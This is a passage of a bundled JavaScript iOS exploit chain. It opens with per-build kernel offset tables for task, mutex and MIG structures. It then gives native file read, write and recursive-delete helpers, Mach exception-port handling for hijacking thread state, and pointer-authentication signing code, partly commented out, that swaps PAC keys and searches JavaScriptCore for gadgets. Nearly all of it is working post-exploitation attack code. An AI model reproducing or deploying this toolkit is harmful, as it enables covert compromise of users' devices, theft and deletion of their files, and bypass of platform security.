					ctid: 0x4a0n,
				},
				2: {
					kernelTask: 0xb86610n
				},
				3: {
					kernelTask: 0xb82610n
				},
				4: {
					kernelTask: 0xc0fd80n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					migLock: 0x408acd0n,
					migSbxMsg: 0x408acf0n,
					migKernelStackLR: 0x396e4a0n
				},
				5: {
					kernelTask: 0xc17e68n,
					migLock: 0x40a6f08n,
					migSbxMsg: 0x40a6f28n,
					migKernelStackLR: 0x3987924n
				},
				6: {
					kernelTask: 0xc1ff78n,
					guardExcCode: 0x398n,
					taskThreads: 0x3e8n,
					tro: 0x3f0n,
					ast: 0x414n,
					mutexData: 0x420n,
					ctid: 0x4b0n,
					migLock: 0x40b6e98n,
					migSbxMsg: 0x40b6eb8n,
					migKernelStackLR: 0x3998de0n,
				}
			}
		}
	}
}


/***/ }),

/***/ "./src/libs/JSUtils/FileUtils.js":
/*!***************************************!*\
  !*** ./src/libs/JSUtils/FileUtils.js ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ FileUtils)
/* harmony export */ });


const TAG = "FILE-UTILS";

const O_RDONLY	= 0x0000;
const O_WRONLY	= 0x0001;
const O_RDWR	= 0x0002;
const O_APPEND  = 0x0008;
const O_CREAT	= 0x0200;
const O_TRUNC	= 0x0400;
const O_EVTONLY	= 0x8000;

const ERROR		= -1;

const DT = {
	DT_UNKNOWN: 0,
	DT_FIFO: 1,
	DT_CHR: 2,
	DT_DIR: 4,
	DT_BLK: 6,
	DT_REG: 8,
	DT_LNK: 10,
	DT_SOCK: 12,
	DT_WHT: 14
};

const SEEK_SET = 0;

class FileUtils {


	static open(path) {
		const fd = Native.callSymbol("open", path, O_RDONLY);
		if (fd == ERROR) {
			console.log(TAG, "Unable to open: " + path);
			return false;
		}
		return fd;
	}

	static close(fd) {
		Native.callSymbol("close", fd);
	}

	static read(fd, size=0) {
		if (!size || size > Native.memSize)
			size = Native.memSize;
		const len = Native.callSymbol("read", fd, Native.mem, size);
		if (!len || len == ERROR)
			return false;
		const buff = Native.read(Native.mem, len);
		return buff;
	}

	static readFile(path, seek=0, length=0) {
		const fd = this.open(path);
		if (fd === false)
			return null;

		let data = new Uint8Array();

		if (seek)
			Native.callSymbol("lseek", fd, seek, SEEK_SET);

		let remaining = length;

		while (true) {
			let size = remaining ? remaining : Native.memSize;
			if (size > Native.memSize)
				size = Native.memSize;
			const buff = this.read(fd, size);
			if (buff === false)
				break;
			const buff8 = new Uint8Array(buff);
			let newData = new Uint8Array(data.length + buff8.length);
			newData.set(data, 0);
			newData.set(buff8, data.length);
			data = newData;

			if (remaining) {
				remaining -= buff.byteLength;
				if (!remaining)
					break;
			}
		}

		this.close(fd);

		return data.buffer;
	}

	static writeFile(path, data) {
		return this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);
	}

	static appendFile(path, data) {
		return this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_APPEND);
	}

	static deleteFile(path) {
		Native.callSymbol("unlink", path);
	}
	static foreachDir(path, func) {
		let dir = Native.callSymbol("opendir", path);
		if (!dir) {
			console.log(TAG, "Unable to open dir: " + path);
			return;
		}

		while (true) {
			let item = this.#readdir(dir);
			if (!item)
				break;

			switch (item.d_type) {
				case DT.DT_DIR:
					if (item.d_name.startsWith("."))
						break;
					func(item.d_name);
					break;
			}
		}

		Native.callSymbol("closedir", dir);
	}

	static foreachFile(path, func) {
		let dir = Native.callSymbol("opendir", path);
		if (!dir) {
			console.log(TAG, "Unable to open dir: " + path);
			return false;
		}

		while (true) {
			let item = this.#readdir(dir);
			if (!item)
				break;

			switch (item.d_type) {
				case DT.DT_REG:
					func(item.d_name);
					break;
			}
		}

		Native.callSymbol("closedir", dir);
		return true;
	}

	static createDir(path, permission=0o755) {
		return !Native.callSymbol("mkdir", path, permission);
	}

	static deleteDir(path, recursive=false) {
		if (recursive) {
			const dir = Native.callSymbol("opendir", path);
			if (!dir) {
				console.log(TAG, "deleteDir: Unable to open dir: " + path);
				return false;
			}

			while (true) {
				const item = this.#readdir(dir);
				if (!item)
					break;

				const newPath = path + '/' + item.d_name;

				switch (item.d_type) {
					case DT.DT_DIR:
						if (item.d_name.startsWith("."))
							break;
						this.deleteDir(newPath, true);
						break;

					case DT.DT_REG:
						console.log(TAG, `deleting: ${newPath}`);
						this.deleteFile(newPath);
						break;
				}
			}

			Native.callSymbol("closedir", dir);
		}

		return !Native.callSymbol("rmdir", path);
	}

	static exists(path, permission=0/*F_OK*/) {
		return !Native.callSymbol("access", path, permission);
	}

	static stat(path) {
		const ret = Native.callSymbol("stat", path, Native.mem);
		if (ret == ERROR)
			return null;
		const buff = Native.read(Native.mem, 144);
		const view = new DataView(buff);

		const dev = view.getInt32(0, true);
		const mode = view.getUint16(0x4, true);
		const nlink = view.getUint16(0x6, true);
		const ino = view.getBigUint64(0x8, true);
		const uid = view.getUint32(0x10, true);
		const gid = view.getUint32(0x14, true);
		const atime_tv_sec = view.getBigInt64(0x20, true);
		const mtime_tv_sec = view.getBigInt64(0x30, true);
		const ctime_tv_sec = view.getBigInt64(0x40, true);
		const size = view.getBigInt64(0x60, true);

		return {
			mode: Number(mode),
			ino: Number(ino),
			dev: Number(dev),
			nlink: Number(nlink),
			uid: Number(uid),
			gid: Number(gid),
			size: Number(size),
			atime: Number(atime_tv_sec),
			mtime: Number(mtime_tv_sec),
			ctime: Number(ctime_tv_sec)
		};
	}

	static #readdir(dir) {
		const itemPtr = Native.callSymbol("readdir", dir);
		if (!itemPtr)
			return null;

		const item = Native.read(itemPtr, 24);
		const view = new DataView(item);

		const d_ino = view.getBigUint64(0, true);
		const d_namlen = view.getUint16(18, true);
		const d_type = view.getUint8(20);
		const d_name = Native.readString(itemPtr + 21n, d_namlen + 1);

		return {
			d_ino: d_ino,
			d_type: d_type,
			d_name: d_name
		};
	}

	static #commonWriteFile(path, data, flags) {
		const fd = Native.callSymbol("open", path, flags, 0o644);
		if (fd == ERROR) {
			console.log(TAG, "Unable to open: " + path);
			return false;
		}

		// For some reason file mode is not applied on open()
		Native.callSymbol("fchmod", fd, 0o644);

		let offs = 0;
		let left = data.byteLength;

		const buffSize = 0x4000;
		const buffPtr = Native.callSymbol("malloc", buffSize);

		while (true) {
			const size = left > buffSize ? buffSize : left;
			const src8 = new Uint8Array(data, offs, size);
			const dst8 = new Uint8Array(src8);
			Native.write(buffPtr, dst8.buffer);
			const len = Native.callSymbol("write", fd, buffPtr, size);
			if (!len || len == ERROR)
				break;
			offs += len;
			left -= len;
			if (!left)
				break;
		}

		Native.callSymbol("free", buffPtr);
		Native.callSymbol("close", fd);

		return true;
	}
}


/***/ }),

/***/ "./src/libs/JSUtils/Utils.js":
/*!***********************************!*\
  !*** ./src/libs/JSUtils/Utils.js ***!
  \***********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Utils)
/* harmony export */ });


const TAG = "UTILS";

const DT = {
	DT_UNKNOWN: 0,
	DT_FIFO: 1,
	DT_CHR: 2,
	DT_DIR: 4,
	DT_BLK: 6,
	DT_REG: 8,
	DT_LNK: 10,
	DT_SOCK: 12,
	DT_WHT: 14
};

class Utils {

	static UINT64_SIZE = 8;
	static UINT32_SIZE = 4;
	static UINT16_SIZE = 2;
	static ARM_THREAD_STATE64 = 6;
	static ARM_THREAD_STATE64_SIZE = 0x110;
	static ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);
	static ptrauth_key_asia = 0;
	static EXC_BAD_ACCESS = 1n;
	static EXC_GUARD = 12n;
	static EXC_MASK_GUARD = (1n << this.EXC_GUARD);
	static EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);
	static EXCEPTION_STATE = 2n;
	static MACH_EXCEPTION_CODES = 0x80000000n;
	static PAGE_SIZE = 0x4000n;
	static PAGE_MASK = (this.PAGE_SIZE - 1n);

	static hex(val) {
		return val.toString(16);
	}

	static memmem(haystack, needle) {
		const hLen = haystack.byteLength;
		const nLen = needle.byteLength;

		if (nLen === 0 || hLen < nLen) {
		  return 0;
		}

		const haystackView = new Uint8Array(haystack);
		const needleView = new Uint8Array(needle);

		for (let i = 0; i <= hLen - nLen; i++) {
		  let found = true;
		  for (let j = 0; j < nLen; j++) {
			if (haystackView[i + j] !== needleView[j]) {
			  found = false;
			  break;
			}
		  }
		  if (found) {
			return i;
		  }
		}

		return 0;
	}

	static ptrauth_string_discriminator(discriminator)
	{
		switch (discriminator) {
			case "pc":
				return 0x7481n;
			case "lr":
				return 0x77d3n;
			case "sp":
				return 0xcbedn;
			case "fp":
				return 0x4517n;
			default:
				console.log(TAG,`Cannot find discriminator for value:${discriminator}`);
				return 0n;
		}
	}

	static ptrauth_string_discriminator_special(discriminator)
	{
		switch (discriminator) {
			case "pc":
				return 0x7481000000000000n;
			case "lr":
				return 0x77d3000000000000n;
			case "sp":
				return 0xcbed000000000000n;
			case "fp":
				return 0x4517000000000000n;
			default:
				console.log(TAG,`Cannot find discriminator for value:${discriminator}`);
				return 0n;
		}
	}

	static ptrauth_blend_discriminator(diver,discriminator)
	{
		return diver & 0xFFFFFFFFFFFFn | discriminator;
	}

    static printArrayBufferInChunks(buffer) {
        const view = new DataView(buffer);
        const chunkSize = 8;

        for (let i = 0; i < buffer.byteLength; i += chunkSize) {
			// Read the chunk as a BigInt
			const chunk = view.getBigUint64(i, true); // Little-endian

            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);
        }
    }

	static MIN(a, b)
	{
		if(a < b)
			return a;
		return b;
	}

	static MAX(a, b)
	{
		if(a > b)
			return a;
		return b;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/Exception.js":
/*!***************************************!*\
  !*** ./src/libs/TaskRop/Exception.js ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Exception)
/* harmony export */ });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./ExceptionReplyStruct */ "./src/libs/TaskRop/ExceptionReplyStruct.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");






const TAG = "EXCEPTION";

const MPO_INSERT_SEND_RIGHT = 0x10;
const MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;
const MACH_SEND_MSG = 0x00000001n;
const MACH_RCV_MSG = 0x00000002n;
const MACH_SEND_TIMEOUT = 0x00000010n;
const MACH_RCV_TIMEOUT = 0x00000100n;
const MACH_MSG_TYPE_MOVE_SEND_ONCE = 18;

class Exception
{
	static ExceptionMessageSize = 0x160n;
	static ExceptionReplySize = 0x13cn;

	static createPort()
	{
		let options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT | MPO_PROVISIONAL_ID_PROT_OPTOUT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		let exceptionPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct",0x203, options, 0n, exceptionPortPtr);
		if (kr != 0)
		{
			console.log(TAG,`Error creating exception port:${kr}`);
			return 0;
		}
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(exceptionPortPtr);
		return BigInt(port);
	}

	static waitException(exceptionPort, excBuffer, timeout, debug)
	{
		let t1 = new Date().getTime();
		if (debug)
			console.log(TAG,`Waiting exception...`);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			excBuffer,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, this.ExceptionMessageSize,
			exceptionPort,
			timeout,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			//console.log(TAG,`Error receiving exception message:${errString}`);
			return false;
		}
		if (debug)
		{
			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(excBuffer,Number(this.ExceptionMessageSize));
			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__["default"](excRes);
			let elapsed = new Date().getTime() - t1;
			//console.log(TAG,`Got exception succesfully after ${elapsed} ms with [id:${exc.Head.msgh_id}, exc=${exc.exception}, code=${Utils.hex(exc.codeFirst)}]`);
			//console.log(TAG,`PC:${Utils.hex(exc.threadState.opaque_pc)}`);
			//console.log(TAG,`LR:${Utils.hex(exc.threadState.opaque_lr)}`);
			//console.log(TAG,`SP:${Utils.hex(exc.threadState.opaque_sp)}`);
			//console.log(TAG,`FP:${Utils.hex(exc.threadState.opaque_fp)}`);
			//for(let i = 0; i < 29; i++)
			//	console.log(TAG,`x[${i}]:${Utils.hex(exc.threadState.registers.get(i))}`);
		}
		return true;
	}

	static replyWithState(exc,state,debug)
	{
		let replyBuf = new ArrayBuffer(Number(this.ExceptionReplySize));
		let reply = new _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__["default"](replyBuf);
		let sendSize = Number(this.ExceptionReplySize);
		let recvSize = 0n;
		if(debug)
		{
			console.log(TAG,`Reply with state:`);
			console.log(TAG,`PC:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_pc)}`);
			console.log(TAG,`LR:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_lr)}`);
			console.log(TAG,`SP:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_sp)}`);
			console.log(TAG,`FP:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_fp)}`);
		}
		
		reply.Head.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
		reply.Head.msgh_size = sendSize;
		reply.Head.msgh_remote_port = exc.Head.msgh_remote_port;
		reply.Head.msgh_local_port = 0;
		reply.Head.msgh_id = exc.Head.msgh_id + 100;
		reply.NDR = exc.NDR;
		reply.RetCode = 0;
		reply.flavor = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64;
		reply.new_stateCnt = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT;
		//TODO make it inside ThreadState to copy thread state to another variable
		for(let i = 0; i < 29; i++)
		{
			reply.threadState.registers.set(i,state.registers.get(i));
		}
		reply.threadState.opaque_fp = state.opaque_fp;
		reply.threadState.opaque_lr = state.opaque_lr;
		reply.threadState.opaque_sp = state.opaque_sp;
		reply.threadState.opaque_pc = state.opaque_pc;
		reply.threadState.cspr = state.cspr;
		reply.threadState.opaque_flags = state.opaque_flags;
		let replyMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(replyMem,replyBuf);
		if(debug)
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].printArrayBufferInChunks(replyBuf);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
				replyMem,
				MACH_SEND_MSG,
				sendSize, recvSize,
				0n,
				0n,
				0n);

		if (ret != 0)
			console.log(TAG,`Error replying exception:${libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret)}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/ExceptionMessageStruct.js":
/*!****************************************************!*\
  !*** ./src/libs/TaskRop/ExceptionMessageStruct.js ***!
  \****************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ExceptionMessageStruct)
/* harmony export */ });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");



class ExceptionMessageStruct 
{
	#buffer;
	#dataView;

	constructor(buffer) {
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
		this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](this.#buffer);
		this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](this.#buffer,64);
	}

	get NDR() { return this.#dataView.getBigUint64(24,true); }
	set NDR(value) { this.#dataView.setBigUint64(24,value,true); }

	get exception() { return this.#dataView.getUint32(32,true); }
	set exception(value) { this.#dataView.setUint32(32,value,true); }

	get codeCnt() { return this.#dataView.getUint32(36,true); }
	set codeCnt(value) { this.#dataView.setUint32(36,value,true); }

	get codeFirst() { return this.#dataView.getBigUint64(40,true); }
	set codeFirst(value) { this.#dataView.setBigUint64(40,value,true); }

	get codeSecond() { return this.#dataView.getBigUint64(48,true); }
	set codeSecond(value) { this.#dataView.setBigUint64(48,value,true); }

	get flavor() { return this.#dataView.getUint32(56,true); }
	set flavor(value) { this.#dataView.setUint32(56,value,true); }

	get old_stateCnt() { return this.#dataView.getUint32(60,true); }
	set old_stateCnt(value) { this.#dataView.setUint32(60,value,true); }

	get paddingFirst() { return this.#dataView.getBigUint64(336,true); }
	set paddingFirst(value) { this.#dataView.setBigUint64(336,value,true); }
	
	get paddingSecond() { return this.#dataView.getBigUint64(344,true); }
	set paddingSecond(value) { this.#dataView.setBigUint64(344,value,true); }
}

/***/ }),

/***/ "./src/libs/TaskRop/ExceptionReplyStruct.js":
/*!**************************************************!*\
  !*** ./src/libs/TaskRop/ExceptionReplyStruct.js ***!
  \**************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ExceptionReplyStruct)
/* harmony export */ });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");



class ExceptionReplyStruct 
{
	#buffer;
	#dataView;

	constructor(buffer) {
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
		this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](this.#buffer);
		this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](this.#buffer,44);
	}

	get NDR() { return this.#dataView.getBigUint64(24,true); }
	set NDR(value) { this.#dataView.setBigUint64(24,value,true); }

	get RetCode() { return this.#dataView.getUint32(32,true); }
	set RetCode(value) { this.#dataView.setUint32(32,value,true); }

	get flavor() { return this.#dataView.getUint32(36,true); }
	set flavor(value) { this.#dataView.setUint32(36,value,true); }
	
	get new_stateCnt() { return this.#dataView.getUint32(40,true); }
	set new_stateCnt(value) { this.#dataView.setUint32(40,value,true); }
}

/***/ }),

/***/ "./src/libs/TaskRop/MachMsgHeaderStruct.js":
/*!*************************************************!*\
  !*** ./src/libs/TaskRop/MachMsgHeaderStruct.js ***!
  \*************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ MachMsgHeaderStruct)
/* harmony export */ });
class MachMsgHeaderStruct
{
	#dataView;

	constructor(buffer, offset = 0) {
		this.#dataView = new DataView(buffer,offset);
	}

	get msgh_bits() { return this.#dataView.getUint32(0,true); }
	set msgh_bits(value) { this.#dataView.setUint32(0,value,true); }

	get msgh_size() { return this.#dataView.getUint32(4,true); }
	set msgh_size(value) { this.#dataView.setUint32(4,value,true); }

	get msgh_remote_port() { return this.#dataView.getUint32(8,true); }
	set msgh_remote_port(value) { this.#dataView.setUint32(8,value,true); }

	get msgh_local_port() { return this.#dataView.getUint32(12,true); }
	set msgh_local_port(value) { this.#dataView.setUint32(12,value,true); }

	get msgh_voucher_port() { return this.#dataView.getUint32(16,true); }
	set msgh_voucher_port(value) { this.#dataView.setUint32(16,value,true); }
	
	get msgh_id() { return this.#dataView.getUint32(20,true); }
	set msgh_id(value) { this.#dataView.setUint32(20,value,true); }

	static MACH_MSGH_BITS(remote, local)
	{
		return ((remote) | ((local) << 8));
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/PAC.js":
/*!*********************************!*\
  !*** ./src/libs/TaskRop/PAC.js ***!
  \*********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PAC)
/* harmony export */ });
//import Chain from "libs/Chain/Chain";
//import Native from "libs/JSUtils/Native";
//import Utils from "libs/JSUtils/Utils";
//import Exception from "./Exception";
//import Task from "./Task";
//import Thread from "./Thread";
//import ThreadState from "./ThreadState";
//import ExceptionMessageStruct from "./ExceptionMessageStruct";
//import Offsets from "Driver/Offsets";

const TAG = "PAC";

class PAC
{
	static gadget_pacia;

	static {
		//this.#findGadgets();
	}
	static remotePACLocal(address, modifier)
	{
		address = address & 0x7fffffffffn;
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}
	static remotePAC(threadAddr, address, modifier)
	{
		return Native.pacia(address, modifier);
		
		//return this.remotePACLocal(address, modifier);
		/*
		if (!this.gadget_pacia)
		{
			console.log(TAG,`Doesn't have gadget_pacia, aborting`);
			return 0;
		}
		address = address & 0x7fffffffffn;

		let signedAddress = 0n;

		// Get PAC keys of remote thread
		let keyA = Thread.getRopPid(threadAddr);
		let keyB = Thread.getJopPid(threadAddr);

		//console.log(TAG,`Key A:${Utils.hex(keyA)}`);
		//console.log(TAG,`Key B:${Utils.hex(keyB)}`);

		let kr = 0;
		let pacThread = Native.mem;
		Native.callSymbol("thread_create", 0x203, pacThread);
		let buffRes = Native.read(pacThread, Utils.UINT32_SIZE);
		let viewRes = new DataView(buffRes);
		pacThread = viewRes.getUint32(0,true);
		//console.log(TAG,`pacThread:${Utils.hex(pacThread)}`);
		let stack = Native.callSymbol("malloc",0x4000n);
		let sp = stack + 0x2000n;
		let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		let state = new ThreadState(stateBuff);
		state.opaque_sp = sp;
		//arm_thread_state64_set_pc_fptr(state, (void*)gadget_pacia);
		let outputBuffer = Native.mem;
		//console.log(TAG,`Before pacia`);
		if(pacia)
			state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
		else
			state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			//console.log(TAG, "Applying 18 fix");
			//state.opaque_lr = 0x401n;
			state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
		}
		//console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
		//state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
		state.registers.set(0,outputBuffer);
		state.registers.set(1,BigInt(address));
		state.registers.set(2,BigInt(modifier));
		state.registers.set(3,BigInt(pacThread));
		state.registers.set(16,BigInt(address));
		state.registers.set(17,BigInt(modifier));

		let exceptionPort = Exception.createPort();
		if (!exceptionPort)
		{
			console.log(TAG,`Cannot create exception port`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}

		//console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);

		kr = Native.callSymbol("thread_set_exception_ports",
			pacThread,
			Utils.EXC_MASK_BAD_ACCESS,
			exceptionPort,
			Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
			BigInt(Utils.ARM_THREAD_STATE64));
		
		if (kr != 0)
		{
			console.log(`thread_set_exception_ports failed:${kr}`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
		//console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
		if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
		{
			console.log(TAG,`Failed to set thread state`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		// Change pacThread PAC keys with those of remote thread
		Thread.setPACKeys(pacThreadAddr, keyA, keyB);
		//console.log(TAG,`Starting PAC thread...`);
		Native.callSymbol("thread_resume",pacThread);
		let excBuffer = Native.mem;
		if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
		{
			console.log(TAG,`Failed to receive exception from PAC thread`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		signedAddress = exc.threadState.registers.get(16);
		//console.log(TAG,`Signed address: ${Utils.hex(address)} -> signedAddress:${Utils.hex(signedAddress)}`);
		this.#cleanup(pacThread, exceptionPort, stack);
		return signedAddress;
		*/
	}

	/*
	static #findGadgets()
	{
		let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
		if (!sym)
		{
			console.log(TAG,`Symbol not found`);
			return false;
		}

		let symStripped = sym & ~0xffffff8000000000n;
		let gadgetOpcodesBuff = new ArrayBuffer(20);
		let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
		gadgetOpcodesView.setUint32(0,0xDAC10230,true);
		gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
		gadgetOpcodesView.setUint32(8,0xF100011F,true);
		gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
		gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
		let data = Native.read(symStripped,0x1000);
		let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
		if (!gadgetOffset)
		{
			console.log(TAG,`pacia_gadget offset not found`);
			return false;
		}
		this.gadget_pacia = symStripped + BigInt(gadgetOffset);

		console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);

		return true;
	}

	static #setThreadState(thread,threadAddr,stateBuff)
	{
		let options = Thread.getOptions(threadAddr);
		options |= 0x8000;	
		Thread.setOptions(threadAddr, options);
		let stateMem = Native.mem;
		Native.write(stateMem,stateBuff);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = Native.callSymbol("thread_set_state",
			thread,
			BigInt(Utils.ARM_THREAD_STATE64),
			stateMem,
			BigInt(Utils.ARM_THREAD_STATE64_COUNT));
		if (kr != 0)
		{
			console.log(TAG,`Failed thread_set_state with error:${kr}`);
			return false;
		}

		options &= ~0x8000;
		Thread.setOptions(threadAddr, options);
		return true;
	}

	static #cleanup(pacThread,exceptionPort,stack)
	{
		Native.callSymbol("thread_terminate",pacThread);
		Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
		Native.callSymbol("free",stack);
	}
	*/
}

/***/ }),

/***/ "./src/libs/TaskRop/PortRightInserter.js":
/*!***********************************************!*\
  !*** ./src/libs/TaskRop/PortRightInserter.js ***!
  \***********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ PortRightInserter)
